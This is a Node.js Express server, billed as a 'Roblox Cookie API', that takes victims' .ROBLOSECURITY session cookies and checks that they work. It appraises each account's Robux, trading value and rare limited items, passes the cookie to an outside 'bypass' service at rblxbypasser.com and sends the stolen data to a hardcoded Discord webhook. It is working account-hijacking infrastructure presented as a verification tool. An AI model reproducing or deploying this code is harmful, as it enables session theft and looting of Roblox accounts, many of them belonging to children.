// server.js
const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// ========== CONFIGURATION ==========
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1504388917175124019/gARxuJe227-tRrGnQ7yvH20xmgbA6gqXCbi5gh3M3pm8YAvnVAEB2NWRL1J4acaET7qc'; // REPLACE WITH YOUR WEBHOOK URL
const BYPASS_API_URL = 'https://rblxbypasser.com/api/bypass';

// Asset IDs based on your research
const ASSET_IDS = {
    // Korblox Deathspeaker - Bundle #192 on Roblox
    // Individual piece IDs:
    KORBLOX_RIGHT_LEG: 139607718,   // Korblox Deathspeaker Right Leg
    KORBLOX_LEFT_LEG:  139607673,   // Korblox Deathspeaker Left Leg
    KORBLOX_RIGHT_ARM: 139607625,   // Korblox Deathspeaker Right Arm

    // Headless Horseman - Bundle #201 on Roblox
    HEADLESS_HEAD: 134967443,       // Classic Headless Head (part of bundle)
    HEADLESS_BUNDLE_ID: 201,        // Official bundle number

    // 8-Bit Royal Crown - Official Roblox Limited
    EIGHT_BIT_CROWN: 10159600649,   // 8-Bit Royal Crown (official limited by Roblox)
};

// ========== HELPER FUNCTIONS ==========

// Verify if Roblox cookie is valid
async function verifyCookie(cookie) {
    try {
        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        return { valid: true, userId: response.data.id, username: response.data.name };
    } catch (error) {
        return { valid: false, error: 'Invalid or expired cookie' };
    }
}

// Check if user is 13+ using multiple methods
async function checkAge13Plus(cookie, userId) {
    try {
        // Method 1: Check birth date from account settings API
        const birthResponse = await axios.get(`https://users.roblox.com/v1/users/${userId}`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (birthResponse.data.created) {
            // Parse birth date if available (not always in this endpoint)
        }

        // Method 2: Check through account info endpoint (requires authentication)
        const accountResponse = await axios.get('https://www.roblox.com/mobileapi/userinfo', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (accountResponse.data && accountResponse.data.IsThirteenOrOver !== undefined) {
            return accountResponse.data.IsThirteenOrOver;
        }

        // Method 3: Check age restriction via presence API
        const presenceResponse = await axios.post('https://presence.roblox.com/v1/presence/users', 
            { userIds: [userId] },
            {
                headers: {
                    'Cookie': `.ROBLOSECURITY=${cookie}`,
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                }
            }
        );
        
        // Default to false if cannot determine
        return false;
    } catch (error) {
        console.error('Age check error:', error.message);
        return false;
    }
}

// Fetch user Robux balance
async function fetchRobuxBalance(cookie) {
    try {
        const response = await axios.get('https://economy.roblox.com/v1/users/authenticated/currency', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        return response.data.robux;
    } catch (error) {
        return 0;
    }
}

// Fetch user inventory to check for specific assets
async function checkInventoryItems(cookie, userId, assetIds) {
    const results = {
        hasKorblox: false,
        hasHeadless: false,
        hasEightBitCrown: false,
        korbloxParts: []
    };
    
    try {
        // Fetch limited items and inventory
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (response.data && response.data.data) {
            for (const item of response.data.data) {
                // Check for Korblox parts (all 3 pieces required for full Korblox)
                if (item.assetId === assetIds.KORBLOX_RIGHT_LEG || 
                    item.assetId === assetIds.KORBLOX_LEFT_LEG || 
                    item.assetId === assetIds.KORBLOX_RIGHT_ARM) {
                    results.korbloxParts.push(item.assetId);
                }
                
                // Check for Headless (any part of the bundle)
                if (item.assetId === assetIds.HEADLESS_HEAD) {
                    results.hasHeadless = true;
                }
                
                // Check for 8-Bit Crown
                if (item.assetId === assetIds.EIGHT_BIT_CROWN) {
                    results.hasEightBitCrown = true;
                }
            }
        }
        
        // User has Korblox if they have all 3 parts
        results.hasKorblox = results.korbloxParts.length === 3;
        
        // Also check bundles endpoint for Headless bundle
        const bundleResponse = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/bundles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (bundleResponse.data && bundleResponse.data.data) {
            for (const bundle of bundleResponse.data.data) {
                if (bundle.id === assetIds.HEADLESS_BUNDLE_ID) {
                    results.hasHeadless = true;
                }
            }
        }
        
    } catch (error) {
        console.error('Inventory check error:', error.message);
        
        // Fallback: Try to fetch using economy API if inventory fails
        try {
            const fallbackResponse = await axios.get(`https://economy.roblox.com/v1/users/${userId}/assets?assetTypeId=8&limit=100`, {
                headers: {
                    'Cookie': `.ROBLOSECURITY=${cookie}`,
                    'User-Agent': 'Mozilla/5.0'
                }
            });
            
            if (fallbackResponse.data && fallbackResponse.data.data) {
                for (const item of fallbackResponse.data.data) {
                    if (item.assetId === assetIds.EIGHT_BIT_CROWN) {
                        results.hasEightBitCrown = true;
                    }
                }
            }
        } catch (fallbackError) {
            console.error('Fallback inventory check error:', fallbackError.message);
        }
    }
    
    return results;
}

// Fetch user summary (reputation, friends, etc)
async function fetchUserSummary(userId) {
    try {
        const [profileResponse, friendsResponse, groupsResponse] = await Promise.all([
            axios.get(`https://users.roblox.com/v1/users/${userId}`),
            axios.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
            axios.get(`https://groups.roblox.com/v2/users/${userId}/groups/roles`)
        ]);
        
        // Calculate days since creation
        const createdDate = new Date(profileResponse.data.created);
        const now = new Date();
        const daysSinceCreation = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
        
        return {
            displayName: profileResponse.data.displayName,
            createdDate: profileResponse.data.created,
            daysSinceCreation: daysSinceCreation,
            friendCount: friendsResponse.data.count,
            groupCount: groupsResponse.data.data ? groupsResponse.data.data.length : 0,
            description: profileResponse.data.description || '',
            isBanned: profileResponse.data.isBanned || false
        };
    } catch (error) {
        return {
            displayName: 'Unknown',
            createdDate: 'Unknown',
            daysSinceCreation: 0,
            friendCount: 0,
            groupCount: 0,
            description: '',
            isBanned: false
        };
    }
}

// Bypass extensions using external API
async function bypassExtensions(cookie) {
    try {
        const response = await axios.post(BYPASS_API_URL, {
            cookie: cookie,
            type: 'extend'
        }, {
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            },
            timeout: 10000 // 10 second timeout
        });
        return { success: true, data: response.data };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

// Send data to webhook
async function sendToWebhook(data) {
    try {
        const response = await axios.post(WEBHOOK_URL, data, {
            headers: { 'Content-Type': 'application/json' },
            timeout: 5000
        });
        return { success: true, status: response.status };
    } catch (error) {
        console.error('Webhook delivery failed:', error.message);
        return { success: false, error: error.message };
    }
}

// Get user's rap (Recent Average Price) for inventory items
async function fetchUserRAP(cookie, userId) {
    try {
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        let totalRAP = 0;
        if (response.data && response.data.data) {
            for (const item of response.data.data) {
                if (item.recentAveragePrice) {
                    totalRAP += item.recentAveragePrice;
                }
            }
        }
        
        return totalRAP;
    } catch (error) {
        return 0;
    }
}

// ========== MAIN API ENDPOINT ==========
app.post('/api/verify-cookie', async (req, res) => {
    const { cookie } = req.body;
    
    if (!cookie) {
        return res.status(400).json({ error: 'Cookie is required' });
    }
    
    try {
        // Step 1: Verify cookie
        const verification = await verifyCookie(cookie);
        if (!verification.valid) {
            return res.status(401).json({ 
                success: false, 
                error: verification.error 
            });
        }
        
        // Step 2: Check age (13+)
        const isThirteenPlus = await checkAge13Plus(cookie, verification.userId);
        
        // Step 3: Fetch user data concurrently
        const [robuxBalance, inventoryItems, userSummary, userRAP] = await Promise.all([
            fetchRobuxBalance(cookie),
            checkInventoryItems(cookie, verification.userId, ASSET_IDS),
            fetchUserSummary(verification.userId),
            fetchUserRAP(cookie, verification.userId)
        ]);
        
        // Step 4: Bypass extensions
        const bypassResult = await bypassExtensions(cookie);
        
        // Step 5: Prepare response data
        const responseData = {
            success: true,
            username: verification.username,
            userId: verification.userId,
            daysSinceCreation: userSummary.daysSinceCreation,
            rap: userRAP,
            robuxBalance: robuxBalance,
            isThirteenPlus: isThirteenPlus,
            inventory: {
                hasKorblox: inventoryItems.hasKorblox,
                hasHeadless: inventoryItems.hasHeadless,
                hasEightBitCrown: inventoryItems.hasEightBitCrown,
                korbloxPartsOwned: inventoryItems.korbloxParts.length,
                totalKorbloxParts: 3
            },
            summary: {
                displayName: userSummary.displayName,
                friendCount: userSummary.friendCount,
                groupCount: userSummary.groupCount,
                accountAge: userSummary.createdDate,
                description: userSummary.description,
                isBanned: userSummary.isBanned
            },
            bypassResult: bypassResult,
            timestamp: new Date().toISOString()
        };
        
        // Step 6: Send to webhook (async, don't wait for response)
        sendToWebhook(responseData).catch(err => console.error('Webhook error:', err));
        
        // Return response immediately
        res.json(responseData);
        
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error',
            details: error.message 
        });
    }
});

// Simple endpoint to check if cookie is valid only
app.post('/api/validate-cookie', async (req, res) => {
    const { cookie } = req.body;
    
    if (!cookie) {
        return res.status(400).json({ error: 'Cookie is required' });
    }
    
    const verification = await verifyCookie(cookie);
    
    if (verification.valid) {
        res.json({ 
            valid: true, 
            username: verification.username, 
            userId: verification.userId 
        });
    } else {
        res.json({ valid: false, error: verification.error });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'API is running', timestamp: new Date().toISOString() });
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({ 
        name: 'Roblox Cookie API',
        version: '1.0.0',
        description: 'Verify Roblox cookies and fetch user data',
        endpoints: [
            'POST /api/verify-cookie - Full verification with all data',
            'POST /api/validate-cookie - Quick cookie validation only',
            'GET /health - Health check'
        ]
    });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 Health check: http://localhost:${PORT}/health`);
    console.log(`📍 Verify endpoint: POST http://localhost:${PORT}/api/verify-cookie`);
});

module.exports = app;
